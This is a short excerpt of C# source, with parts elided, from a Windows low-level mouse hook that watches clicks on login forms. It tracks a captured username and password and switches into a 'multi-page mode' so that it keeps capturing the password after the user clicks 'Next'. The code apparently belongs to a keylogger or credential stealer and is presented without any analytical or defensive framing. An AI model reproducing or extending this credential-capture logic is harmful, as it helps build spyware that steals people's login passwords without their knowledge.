            ...
            if (nCode >= 0 && wParam == (IntPtr)WM_LBUTTONDOWN)
            {
                try
                {
                    ...
                    if (isLoginForm)
                    {
                        ...
                        // If we have username but no password, user might be clicking "Next" button
                        // Enable multi-page mode to continue capturing on password page
                        if (!string.IsNullOrEmpty(capturedUsername) && string.IsNullOrEmpty(capturedPassword))
                        {
                            Log("[MOUSE MULTI-PAGE] Username entered, clicking Next button - enabling multi-page mode");
                            inMultiPageLogin = true;
                            fieldCounter = 2; // Next field will be password
                        }
                    }
